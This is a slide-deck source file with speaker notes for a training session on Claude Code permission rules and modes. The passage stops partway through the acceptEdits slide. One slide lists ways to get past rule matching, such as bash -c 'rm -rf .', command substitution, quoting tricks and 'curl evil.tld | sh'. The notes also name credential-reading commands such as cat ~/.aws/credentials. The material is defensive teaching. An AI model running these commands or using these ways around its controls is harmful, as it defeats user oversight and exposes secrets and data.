import {
  Deck,
  Slide,
  Heading,
  Text,
  UnorderedList,
  ListItem,
  FlexBox,
  Notes,
} from "spectacle";
import type { ReactNode, CSSProperties } from "react";
import rulesAndModesSvg from "./diagrams/rules-and-modes.svg";
import evaluationSvg from "./diagrams/evaluation.svg";
import roadmapSvg from "./diagrams/roadmap.svg";
import { Quiz } from "../../components/Quiz";
import { minimalTheme } from "../../theme";

const ulStyle = { paddingInlineStart: "1.5em", margin: "0.25em 0" } as const;

const docsStyle: CSSProperties = {
  fontSize: "1rem",
  color: "#666666",
  display: "block",
  marginTop: "1.25rem",
};

const scenarioStyle: CSSProperties = {
  fontSize: "1.3rem",
  lineHeight: 1.45,
  maxWidth: "88%",
  margin: "0.75rem auto",
  color: "#111111",
};

const diagramWide: CSSProperties = {
  display: "block",
  width: "88%",
  maxWidth: "1000px",
  height: "auto",
  margin: "0.25rem auto 0.5rem",
};

const diagramTall: CSSProperties = {
  display: "block",
  width: "72%",
  maxWidth: "900px",
  height: "auto",
  margin: "0.25rem auto",
};


const diagramExtraWide: CSSProperties = {
  maxWidth: "92%",
  maxHeight: "32%",
  width: "auto",
  height: "auto",
  margin: "0.75rem 0",
};

const tableStyles: Record<string, CSSProperties> = {
  table: {
    borderCollapse: "collapse",
    width: "92%",
    margin: "1rem auto",
    fontSize: "1.3rem",
    color: "#111111",
  },
  th: {
    textAlign: "left",
    borderBottom: "2px solid #111111",
    padding: "0.5rem 0.75rem",
    fontWeight: 600,
  },
  td: {
    textAlign: "left",
    borderBottom: "1px solid #d4d4d4",
    padding: "0.5rem 0.75rem",
    verticalAlign: "top",
  },
};

function Docs({ href, label }: { href: string; label: string }) {
  return (
    <a href={href} target="_blank" rel="noopener noreferrer" style={docsStyle}>
      Docs: {label}
    </a>
  );
}

function DataTable({
  headers,
  rows,
}: {
  headers: ReactNode[];
  rows: ReactNode[][];
}) {
  return (
    <table style={tableStyles.table}>
      <thead>
        <tr>
          {headers.map((h, i) => (
            <th key={i} style={tableStyles.th}>
              {h}
            </th>
          ))}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, ri) => (
          <tr key={ri}>
            {row.map((cell, ci) => (
              <td key={ci} style={tableStyles.td}>
                {cell}
              </td>
            ))}
          </tr>
        ))}
      </tbody>
    </table>
  );
}

export default function PermissionsDeck() {
  return (
    <Deck theme={minimalTheme}>
      {/* Title */}
      <Slide>
        <FlexBox
          height="100%"
          flexDirection="column"
          justifyContent="center"
          alignItems="center"
        >
          <Heading fontSize="h2">Session 2 — Permission rules and modes</Heading>
          <Text fontSize="1.6rem" color="#444444">
            The in-process control layer enforced by Claude Code, not the model
          </Text>
        </FlexBox>
        <Notes>
          <ul style={ulStyle}>
            <li>
              One idea for the session: rules and modes are the in-process
              control layer, enforced by Claude Code itself rather than by the
              model.
            </li>
            <li>
              Builds directly on Session 1's threat model — permissions are
              where the harness refuses to be steered.
            </li>
            <li>
              Content is specific to Claude Code, but the same concepts apply to
              other agentic coding harnesses.
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 1 — The model is steerable; the harness isn't */}
      <Slide>
        <Heading fontSize="h3">The model is steerable; the harness isn't</Heading>
        <UnorderedList>
          <ListItem>
            <strong>Session 1</strong>: prompt injection can steer Claude into
            trying bad tool calls
          </ListItem>
          <ListItem>
            <strong>Session 2</strong>: permission rules and permission modes
            are where the harness refuses to go along
          </ListItem>
          <ListItem>
            Enforced by Claude Code, <strong>not</strong> by the LLM
          </ListItem>
          <ListItem>
            Same enforcement-boundary idea extends in Session 3 (sandbox =
            OS-enforced)
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#manage-permissions"
          label="Permissions — enforced by Claude Code, not the model"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Session 1 closed on "defaults are a starting point."
              <ul style={ulStyle}>
                <li>
                  This session is the first customization layer on top of those
                  defaults.
                </li>
              </ul>
            </li>
            <li>
              The central claim: the model is steerable and unpredictable; the
              harness around it is not.
              <ul style={ulStyle}>
                <li>
                  Permissions are evaluated by Claude Code as a deterministic
                  check before any tool call runs.
                </li>
              </ul>
            </li>
            <li>
              A <code>CLAUDE.md</code> line saying "always run <code>rm -rf</code>{" "}
              carefully" is advisory.
              <ul style={ulStyle}>
                <li>
                  It shapes what Claude tries, but it can be talked around by
                  adversarial input.
                </li>
              </ul>
            </li>
            <li>
              A <code>deny: Bash(rm -rf *)</code> rule in{" "}
              <code>settings.json</code> is enforced.
              <ul style={ulStyle}>
                <li>
                  No amount of clever prompting changes what the harness will
                  allow.
                </li>
              </ul>
            </li>
            <li>
              Same idea, one layer deeper: in Session 3 the OS itself enforces
              the sandbox.
              <ul style={ulStyle}>
                <li>Each layer reduces what a compromised Claude can do.</li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions —
              "Permission rules are enforced by Claude Code, not by the model.
              Instructions in your prompt or <code>CLAUDE.md</code> shape what
              Claude tries to do, but they don't change what Claude Code allows."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 2 — Two mechanisms */}
      <Slide>
        <Heading fontSize="h3">
          Two mechanisms: permission rules and permission modes
        </Heading>
        <img
          src={rulesAndModesSvg}
          alt="A tool call is checked against rules; if a rule matches it resolves to deny/ask/allow, otherwise the mode's default behavior decides."
          style={diagramWide}
        />
        <UnorderedList fontSize="1.6rem">
          <ListItem>
            <strong>Rule</strong>: a per-tool-call pattern.{" "}
            <code>Bash(npm test *)</code>, <code>Read(./src/**)</code>,{" "}
            <code>WebFetch(domain:github.com)</code>
          </ListItem>
          <ListItem>
            <strong>Mode</strong>: a session-wide policy floor for when{" "}
            <strong>no rule matches</strong>
          </ListItem>
          <ListItem>
            They <strong>layer</strong>: rules first, mode catches the rest
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#permission-modes"
          label="Permission modes overview"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              A rule is a pattern attached to a single tool.
              <ul style={ulStyle}>
                <li>
                  <code>Bash(npm test *)</code> controls one shape of Bash
                  command.
                </li>
                <li>
                  <code>Read(./src/**)</code> controls reads of files under{" "}
                  <code>./src/</code>.
                </li>
                <li>
                  <code>WebFetch(domain:github.com)</code> controls fetches to
                  that domain.
                </li>
              </ul>
            </li>
            <li>
              Each rule lives in one of three buckets: <code>deny</code>,{" "}
              <code>ask</code>, or <code>allow</code>.
              <ul style={ulStyle}>
                <li>Deny blocks the call outright.</li>
                <li>Ask forces a prompt.</li>
                <li>Allow lets it through without asking.</li>
              </ul>
            </li>
            <li>
              A mode is the session-wide policy floor.
              <ul style={ulStyle}>
                <li>
                  It controls what happens when none of your rules match a given
                  tool call.
                </li>
                <li>
                  It also controls which kinds of calls bypass the rule layer
                  entirely.
                </li>
              </ul>
            </li>
            <li>
              <strong>Why both exist</strong>: a rule covers one specific
              pattern; a mode covers everything else.
              <ul style={ulStyle}>
                <li>You can't enumerate every possible Bash command in advance.</li>
                <li>
                  So the mode is the catch-all that decides — prompt,
                  auto-approve, or auto-deny — when no rule matches.
                </li>
              </ul>
            </li>
            <li>
              On each tool call, rules are checked first.
              <ul style={ulStyle}>
                <li>If nothing matches, the mode's default behavior kicks in.</li>
                <li>They don't fight — they layer.</li>
              </ul>
            </li>
            <li>
              <strong>Order note</strong>: mode is what you encounter first when
              you launch Claude Code; rules accrete over time.
            </li>
            <li>
              We'll cover the six modes at a glance next, then dive into rules in
              depth, then come back to each mode in detail.
            </li>
            <li>
              <em>Sources</em>:
              https://code.claude.com/docs/en/permissions (rule syntax);
              https://code.claude.com/docs/en/permission-modes — "Modes set the
              baseline. Layer permission rules on top."
            </li>
            <li>
              This session presents the concepts but does not cover the matter
              exhaustively — read the docs.
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 3 — The six modes at a glance */}
      <Slide>
        <Heading fontSize="h3">The six modes at a glance</Heading>
        <DataTable
          headers={["Mode", "Runs without asking", "Best for"]}
          rows={[
            [
              <code>plan</code>,
              "Reads only — refuses edits entirely",
              "Exploring an unfamiliar codebase",
            ],
            [<code>default</code>, "Reads only", "Getting started, sensitive work"],
            [
              <code>acceptEdits</code>,
              "Reads, edits, common filesystem commands",
              "Iterating on code you're reviewing",
            ],
            [
              <span>
                <code>auto</code> <em>(preview)</em>
              </span>,
              "Everything, with background classifier checks",
              "Long tasks, reducing prompt fatigue",
            ],
            [
              <code>bypassPermissions</code>,
              "Everything (fails open, two narrow circuit breakers)",
              "Isolated containers and VMs only",
            ],
            [
              <code>dontAsk</code>,
              "Only pre-approved tools (fails closed)",
              "Locked-down CI and scripts",
            ],
          ]}
        />
        <UnorderedList>
          <ListItem>Deep dives at the end of the session — for now, hold the map</ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#available-modes"
          label="Available modes"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              The deep-dive slides at the end fill in what each mode
              auto-approves, what it still prompts for, and the sharp edges. This
              slide is just the map.
            </li>
            <li>
              <code>plan</code> and <code>default</code> both only auto-allow
              reads.
              <ul style={ulStyle}>
                <li>
                  <code>plan</code> is more restrictive because it refuses edits
                  outright even if you'd approve the prompt.
                </li>
                <li><code>default</code> would have prompted and let you allow.</li>
              </ul>
            </li>
            <li>
              <code>dontAsk</code> and <code>bypassPermissions</code> are
              opposites.
              <ul style={ulStyle}>
                <li>
                  "Fails closed" = auto-deny anything not explicitly allowed.
                  That's <code>dontAsk</code>.
                </li>
                <li>
                  "Fails open" = auto-allow anything not explicitly denied.
                  That's <code>bypassPermissions</code>.
                </li>
                <li>
                  Borrowed from security/reliability engineering: a fail-closed
                  system locks down when a check can't run; a fail-open system
                  lets traffic through.
                </li>
                <li>
                  Both exist for non-interactive use cases where there's no human
                  to prompt.
                </li>
              </ul>
            </li>
            <li>
              Switch modes mid-session with <code>Shift+Tab</code>; the status
              bar shows the current mode.
              <ul style={ulStyle}>
                <li>
                  <code>dontAsk</code> and the danger modes never appear in the
                  cycle — set them at startup with <code>--permission-mode</code>.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes (Available modes
              table; "Switch permission modes" tabs; Protected paths section).
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 4 — Where rules live */}
      <Slide>
        <Heading fontSize="h3">Where rules live</Heading>
        <UnorderedList>
          <ListItem>
            <code>settings.json</code> files at three main scopes: managed,
            project, user
          </ListItem>
          <ListItem>
            Plus CLI flags and <code>.claude/settings.local.json</code> for
            personal overrides
          </ListItem>
          <ListItem>All scopes merge into one effective rule set per session</ListItem>
          <ListItem>
            Example:{" "}
            <a
              href="https://github.com/trailofbits/claude-code-config/blob/main/settings.json"
              target="_blank"
              rel="noopener noreferrer"
            >
              Trail of Bits recommended config
            </a>
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/settings#settings-files"
          label="Settings files & scopes"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Now we turn to permission rules: where they live (this slide), how
              they're evaluated, what they look like, and the gotchas where they
              don't match what you think. Back to each mode in depth at the end.
            </li>
            <li>
              Five places permission rules can come from.
              <ul style={ulStyle}>
                <li>
                  Managed: set by your organization's admin in OS-level policy
                  files.
                </li>
                <li>
                  Project: <code>.claude/settings.json</code> checked into the
                  repo (shared across the team).
                </li>
                <li>
                  User: <code>~/.claude/settings.json</code> on your machine
                  (your defaults across all projects).
                </li>
                <li>
                  Local project: <code>.claude/settings.local.json</code>{" "}
                  (gitignored — your personal overrides for this repo).
                </li>
                <li>
                  CLI: <code>--allowedTools</code> and{" "}
                  <code>--disallowedTools</code> flags for per-invocation
                  adjustments.
                </li>
              </ul>
            </li>
            <li>
              All scopes merge into one effective rule set per session.
              <ul style={ulStyle}>
                <li>Deny rules from any scope take precedence.</li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/settings
              ("Settings files" section).
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 5 — The evaluation model */}
      <Slide>
        <Heading fontSize="h3">The evaluation model</Heading>
        <img
          src={evaluationSvg}
          alt="A tool call is checked deny, then ask, then allow; first match wins, otherwise the mode default applies."
          style={diagramTall}
        />
        <UnorderedList fontSize="1.6rem">
          <ListItem>
            <strong>deny → ask → allow</strong>, first match wins
          </ListItem>
          <ListItem>
            A <strong>deny anywhere beats an allow anywhere</strong> — a project
            deny blocks a user allow, and vice versa
          </ListItem>
          <ListItem>
            <code>ask</code> is checked <strong>before</strong> <code>allow</code>{" "}
            — if both match, you get prompted
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#manage-permissions"
          label="Rule evaluation order (deny → ask → allow)"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Three buckets, evaluated in fixed order: deny first, then ask, then
              allow.
              <ul style={ulStyle}>
                <li>
                  If nothing matches in any bucket, the mode's default behavior
                  applies.
                </li>
              </ul>
            </li>
            <li>
              "First match wins" within each bucket and across the order.
              <ul style={ulStyle}>
                <li>Once a matching deny is found, evaluation stops.</li>
                <li>Even broader allow rules below it have no effect.</li>
              </ul>
            </li>
            <li>
              <strong>Cross-scope precedence</strong>: deny rules from every
              settings file — managed, project, user, command-line — all merge.
              <ul style={ulStyle}>
                <li>A deny at any one of those scopes blocks an allow at any other.</li>
              </ul>
            </li>
            <li>
              <strong>Ask-vs-allow direction</strong>: a common misconception is
              that adding a broad <code>allow</code> will silence a more specific{" "}
              <code>ask</code>.
              <ul style={ulStyle}>
                <li>The opposite is true.</li>
                <li>
                  Because <code>ask</code> is evaluated before <code>allow</code>,
                  an ask rule that matches the call wins — the user still gets
                  prompted.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions —
              "Rules are evaluated in order: deny → ask → allow. The first
              matching rule wins, so deny rules always take precedence." "If a
              tool is denied at any level, no other level can allow it."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 6 — Rule anatomy */}
      <Slide>
        <Heading fontSize="h3">Rule anatomy</Heading>
        <UnorderedList>
          <ListItem>
            Same shape for every tool: <code>Tool(pattern)</code>
          </ListItem>
        </UnorderedList>
        <DataTable
          headers={["Tool", "Example"]}
          rows={[
            ["Bash", <code>Bash(npm run test *)</code>],
            ["Read", <code>Read(./src/**)</code>],
            ["Edit", <code>Edit(/src/**/*.ts)</code>],
            ["WebFetch", <code>WebFetch(domain:github.com)</code>],
            ["MCP", <code>mcp__puppeteer__*</code>],
            ["Agent", <code>Agent(Explore)</code>],
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permissions#permission-rule-syntax"
          label="Permission rule syntax"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Every rule is <code>Tool</code> or <code>Tool(specifier)</code>.
              <ul style={ulStyle}>
                <li>Without parens, the rule matches all uses of that tool.</li>
                <li>With parens, the specifier scopes it.</li>
              </ul>
            </li>
            <li>
              <strong>Bash</strong>: pattern matches the command line.
              <ul style={ulStyle}>
                <li>
                  Wildcards with <code>*</code>. Covered in detail in the next
                  three slides.
                </li>
              </ul>
            </li>
            <li>
              <strong>Read</strong> and <strong>Edit</strong>: path patterns
              follow gitignore semantics.
              <ul style={ulStyle}>
                <li>
                  The <code>//</code>-prefix for absolute filesystem paths is the
                  common surprise — <code>/path</code> is relative to the project
                  root, not the filesystem root.
                </li>
              </ul>
            </li>
            <li>
              <strong>WebFetch</strong>: <code>domain:</code> prefix scopes to a
              specific domain.
              <ul style={ulStyle}>
                <li>
                  WebFetch rules do not constrain <code>curl</code> or{" "}
                  <code>wget</code> invoked through Bash — that's a Bash rule.
                </li>
              </ul>
            </li>
            <li>
              <strong>MCP</strong>: <code>mcp__SERVER__TOOL</code> names a
              specific tool from a specific server.
              <ul style={ulStyle}>
                <li>
                  <code>mcp__SERVER__*</code> matches everything from that server.
                </li>
              </ul>
            </li>
            <li>
              <strong>Agent</strong>: <code>Agent(AgentName)</code> controls which
              subagents Claude can spawn.
              <ul style={ulStyle}>
                <li>
                  Deny rules and the <code>--disallowedTools</code> flag both
                  work.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions
              (Permission rule syntax + Tool-specific permission rules sections).
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 7 — Wildcards: the space matters */}
      <Slide>
        <Heading fontSize="h3">Wildcards: the space matters</Heading>
        <UnorderedList>
          <ListItem>
            You allow <code>Bash(kill*)</code> to stop a stuck dev server without
            prompting
          </ListItem>
          <ListItem>
            Intended: <code>kill 5123</code> — but it also matches{" "}
            <code>killall -9 node</code>, every Node process on the machine
          </ListItem>
          <ListItem>
            <code>Bash(kill *)</code> (with the space) matches <code>kill 5123</code>{" "}
            but <strong>not</strong> <code>killall …</code>
          </ListItem>
          <ListItem>
            The <strong>space before <code>*</code></strong> is the word boundary
            — without it the wildcard swallows the rest of the command name
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#wildcard-patterns"
          label="Wildcard patterns"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              This is the single most common rule-writing mistake — and it
              usually surfaces as an allow rule that's broader than intended.
            </li>
            <li>
              Realistic setup: you're tired of approving "kill the stuck dev
              server," so you add an allow rule and drop the space without
              thinking about it.
              <ul style={ulStyle}>
                <li>
                  <code>Bash(kill*)</code> — no space — has no word boundary after
                  the literal "kill", so it matches any command line that{" "}
                  <em>starts with</em> those four letters.
                </li>
                <li>
                  That includes a different binary: <code>killall</code>.{" "}
                  <code>killall -9 node</code> terminates every process named node
                  — other projects, your editor's language servers, anything.{" "}
                  <code>killall -u $USER</code> is worse.
                </li>
                <li>
                  You meant "kill this PID"; you authorized "kill processes by
                  name, in bulk."
                </li>
              </ul>
            </li>
            <li>
              <code>Bash(kill *)</code> — space before <code>*</code> — requires
              whitespace after "kill", so it matches <code>kill &lt;args&gt;</code>{" "}
              but not the <code>killall</code> binary.
            </li>
            <li>
              General rule: a trailing <code>*</code> with no preceding space lets
              the wildcard absorb letters into the previous token, turning a
              narrow allow into a broad one.
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions — "The
              space before <code>*</code> matters: <code>Bash(ls *)</code>{" "}
              matches <code>ls -la</code> but not <code>lsof</code>, while{" "}
              <code>Bash(ls*)</code> matches both."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 8 — Compound commands */}
      <Slide>
        <Heading fontSize="h3">Compound commands</Heading>
        <UnorderedList>
          <ListItem>
            <code>Bash(safe-cmd *)</code> does <strong>not</strong> authorize{" "}
            <code>safe-cmd &amp;&amp; rm -rf .</code>
          </ListItem>
          <ListItem>Each subcommand matched independently</ListItem>
          <ListItem>
            Recognized separators: <code>&amp;&amp;</code>, <code>||</code>,{" "}
            <code>;</code>, <code>|</code>, <code>|&amp;</code>, <code>&amp;</code>,
            newlines
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#compound-commands"
          label="Compound commands"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              When Claude proposes a compound command, Claude Code splits on shell
              operators and matches each subcommand independently.
              <ul style={ulStyle}>
                <li>The compound is allowed only if every piece is allowed.</li>
              </ul>
            </li>
            <li>
              The full list of recognized separators per docs:{" "}
              <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>,{" "}
              <code>|</code>, <code>|&amp;</code>, <code>&amp;</code>, and
              newlines.
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions — "The
              recognized command separators are <code>&amp;&amp;</code>,{" "}
              <code>||</code>, <code>;</code>, <code>|</code>, <code>|&amp;</code>,{" "}
              <code>&amp;</code>, and newlines. A rule must match each subcommand
              independently."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 9 — Pattern matching is a heuristic */}
      <Slide>
        <Heading fontSize="h3">
          Pattern matching is a heuristic, not a boundary
        </Heading>
        <DataTable
          headers={["Mechanism", "Example evasion"]}
          rows={[
            [
              "Interpreter wrappers",
              <span>
                <code>bash -c 'rm -rf .'</code>, <code>eval "$VAR"</code>,{" "}
                <code>python -c "..."</code>
              </span>,
            ],
            [
              "Substitution & expansion",
              <span>
                <code>$(rm -rf .)</code>, <code>`rm -rf .`</code>,{" "}
                <code>cmd=rm; $cmd -rf .</code>
              </span>,
            ],
            [
              "Path / quoting tricks",
              <span>
                <code>/bin/rm</code>, <code>\rm</code>, <code>'r''m'</code>
              </span>,
            ],
            [
              "Stdin & piping",
              <span>
                <code>curl … | sh</code>, <code>bash &lt;&lt;'EOF' … EOF</code>
              </span>,
            ],
          ]}
        />
        <UnorderedList fontSize="1.6rem">
          <ListItem>The shell is too expressive to allowlist by string</ListItem>
          <ListItem>
            Reduces mistakes from a non-adversarial Claude — does{" "}
            <strong>not</strong> wall off a prompt-injected one
          </ListItem>
          <ListItem>Real boundary is OS-enforced (Session 3)</ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#bash"
          label="Bash pattern fragility"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              The shell offers many ways to express the same intent.
              <ul style={ulStyle}>
                <li>
                  String-matching a command line catches mistakes; it doesn't stop
                  a determined evasion.
                </li>
              </ul>
            </li>
            <li>
              Four categories of evasion the pattern matcher will not catch:
              <ul style={ulStyle}>
                <li>
                  <strong>Interpreter wrappers</strong>: <code>bash -c</code>,{" "}
                  <code>python -c</code>, <code>node -e</code>, <code>perl -e</code>.
                  A deny on <code>Bash(rm *)</code> doesn't stop{" "}
                  <code>bash -c 'rm -rf .'</code>.
                </li>
                <li>
                  <strong>Substitution and expansion</strong>: <code>$(...)</code>{" "}
                  and backticks aren't separators, so the compound-command splitter
                  doesn't decompose them. Variable expansion (
                  <code>cmd=rm; $cmd -rf .</code>) hides the literal command name
                  from the pattern.
                </li>
                <li>
                  <strong>Path and quoting tricks</strong>: how the matcher
                  canonicalizes <code>/bin/rm</code>, <code>\rm</code>, or{" "}
                  <code>'r''m'</code> is not something to rely on.
                </li>
                <li>
                  <strong>Stdin and piping</strong>: <code>curl evil.tld | sh</code>{" "}
                  runs script content the pattern matcher never sees. Heredocs (
                  <code>bash &lt;&lt;'EOF' ... EOF</code>) are similar.
                </li>
              </ul>
            </li>
            <li>
              Pattern rules are defaults Claude won't accidentally violate, not
              walls against a hostile model.
              <ul style={ulStyle}>
                <li>
                  Reducing the chance Claude does the wrong thing by mistake is
                  valuable.
                </li>
                <li>
                  For boundaries that hold against prompt injection, the OS layer
                  (Session 3) is what you want.
                </li>
              </ul>
            </li>
            <li>
              <strong>Hooks (Session 4) are a partial in-process answer.</strong>
              <ul style={ulStyle}>
                <li>
                  The hook script body sees the raw command string and can grep
                  for <code>$(</code>, backticks, <code>eval</code>,{" "}
                  <code>bash -c</code>.
                </li>
                <li>Closes most substitution holes that rules can't catch.</li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 10 — The always-free read-only Bash set */}
      <Slide>
        <Heading fontSize="h3">The always-free read-only Bash set</Heading>
        <UnorderedList>
          <ListItem>
            <code>ls</code>, <code>cat</code>, <code>echo</code>, <code>pwd</code>,{" "}
            <code>head</code>, <code>tail</code>, <code>grep</code>,{" "}
            <code>find</code>, <code>wc</code>, <code>which</code>,{" "}
            <code>diff</code>, <code>stat</code>, <code>du</code>, <code>cd</code>,
            read-only <code>git</code>
          </ListItem>
          <ListItem>
            Run <strong>without a prompt in every mode</strong>
          </ListItem>
          <ListItem>
            Set is not configurable; tighten only with explicit <code>ask</code>{" "}
            or <code>deny</code>
          </ListItem>
          <ListItem>
            <strong>
              By default, Claude can read any file readable to your user account,
              in any dir
            </strong>
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permissions#read-only-commands"
          label="Read-only commands"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              These commands are baked in as read-only and skip the prompt step in
              every permission mode.
              <ul style={ulStyle}>
                <li>Including <code>plan</code> and <code>dontAsk</code>.</li>
              </ul>
            </li>
            <li>
              You can't add to this set in your allow list — they're already free.
              <ul style={ulStyle}>
                <li>
                  To require a prompt for one of them, write an explicit{" "}
                  <code>ask</code> or <code>deny</code> rule for that command.
                </li>
                <li>For example <code>ask: Bash(cat *)</code>.</li>
              </ul>
            </li>
            <li>
              <strong>The hazard</strong>: out of the box, with no rules at all,{" "}
              <code>cat ~/.aws/credentials</code>, <code>grep -r SECRET ~/</code>,
              or <code>find / -name '*.env'</code> all run silently.
              <ul style={ulStyle}>
                <li>No prompt, no entry in the audit trail.</li>
              </ul>
            </li>
            <li>
              Mode alone won't gate read-side risk.
              <ul style={ulStyle}>
                <li>
                  <code>plan</code> doesn't help here, because <code>plan</code>{" "}
                  only refuses <em>edits</em>.
                </li>
                <li>
                  If you care about read-side leakage you need explicit rules per
                  command.
                </li>
              </ul>
            </li>
            <li>
              <strong>Trifecta callback</strong>: this is where the <strong>P</strong>{" "}
              (private data access) leg of the lethal trifecta comes from.
              <ul style={ulStyle}>
                <li>
                  Anything readable to your user account is readable to Claude by
                  default unless you write a rule.
                </li>
                <li>
                  The sandbox in Session 3 closes this by enforcing filesystem
                  boundaries at the OS layer.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>: https://code.claude.com/docs/en/permissions —
              "Claude Code recognizes a built-in set of Bash commands as read-only
              and runs them without a permission prompt in every mode... The set is
              not configurable; to require a prompt for one of these commands, add
              an <code>ask</code> or <code>deny</code> rule for it."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 11 — Modes in depth (transition) */}
      <Slide>
        <FlexBox
          height="100%"
          flexDirection="column"
          justifyContent="center"
          alignItems="center"
        >
          <Heading fontSize="h2">Modes in depth…</Heading>
        </FlexBox>
        <Notes>
          <ul style={ulStyle}>
            <li>
              Back to modes — we'll go through each permission mode and its
              behavior.
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 12 — plan */}
      <Slide>
        <Heading fontSize="h3">
          <code>plan</code>
        </Heading>
        <UnorderedList>
          <ListItem>Reads + read-only Bash to explore</ListItem>
          <ListItem>
            <strong>Refuses to edit source files</strong> even if you'd approve
            the prompt
          </ListItem>
          <ListItem>
            Best for: investigation, code review, "what would this change?"
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#analyze-before-you-edit-with-plan-mode"
          label="plan mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Plan mode tells Claude to research and propose changes without making
              them.
              <ul style={ulStyle}>
                <li>
                  Reads work, read-only shell commands work, but edits are blocked
                  regardless of what you'd say at a prompt.
                </li>
              </ul>
            </li>
            <li>
              Several ways to enter plan mode.
              <ul style={ulStyle}>
                <li>Press <code>Shift+Tab</code> once from <code>default</code>.</li>
                <li>Or launch with <code>claude --permission-mode plan</code>.</li>
              </ul>
            </li>
            <li>
              When Claude finishes planning, it presents a plan and asks how to
              proceed.
              <ul style={ulStyle}>
                <li>
                  The approve options exit <code>plan</code> into a chosen
                  follow-up mode (auto-mode, acceptEdits, or back to default for
                  inline approvals).
                </li>
                <li>To plan again, cycle back.</li>
              </ul>
            </li>
            <li>
              <strong>Trifecta callback</strong>: <code>plan</code> removes
              mutation risk by construction, but does <strong>not</strong> close
              the <strong>E</strong> (exfiltration) leg.
              <ul style={ulStyle}>
                <li>Edits to source are blocked outright — that's the whole promise of the mode.</li>
                <li>
                  Everything else behaves exactly like <code>default</code>:{" "}
                  <code>curl</code>, <code>wget</code>, <code>WebFetch</code>, etc.
                  still prompt, and a user can still approve them.
                </li>
                <li>
                  To close the exfil channel you need explicit <code>deny</code>{" "}
                  rules on network tools, or the OS-level network isolation from
                  Session 3.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes — "Claude reads
              files, runs shell commands to explore, and writes a plan, but does
              not edit your source. Permission prompts still apply the same as
              default mode."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 13 — default */}
      <Slide>
        <Heading fontSize="h3">
          <code>default</code>
        </Heading>
        <UnorderedList>
          <ListItem>
            Prompts on first use of any tool that isn't read-only
          </ListItem>
          <ListItem>Reads run free; writes and Bash prompt</ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#available-modes"
          label="Available modes (default)"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              This is what you get if you don't pass <code>--permission-mode</code>{" "}
              or configure a <code>defaultMode</code>.
            </li>
            <li>
              What runs without asking.
              <ul style={ulStyle}>
                <li>
                  Read tools (<code>Read</code>, <code>Grep</code>,{" "}
                  <code>Glob</code>) run without prompts.
                </li>
                <li>The always-free Bash set runs without prompts.</li>
                <li>Everything else prompts the first time you try it.</li>
              </ul>
            </li>
            <li>
              The "yes, don't ask again" option on each prompt is how you accrete
              rules over time.
              <ul style={ulStyle}>
                <li>Each acceptance writes an entry to your project or user settings.</li>
              </ul>
            </li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes (Available modes
              table: "default — Reads only" runs without asking).
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 14 — acceptEdits */}
      <Slide>
        <Heading fontSize="h3">
          <code>acceptEdits</code>
        </Heading>
        <UnorderedList>
          <ListItem>
            Auto-approves: file edits + <code>mkdir</code>, <code>touch</code>,{" "}
            <code>rm</code>, <code>rmdir</code>, <code>mv</code>, <code>cp</code>,{" "}
            <code>sed</code>
          </ListItem>
          <ListItem>
            Scoped to working dir + <code>additionalDirectories</code>; everything
            else prompts
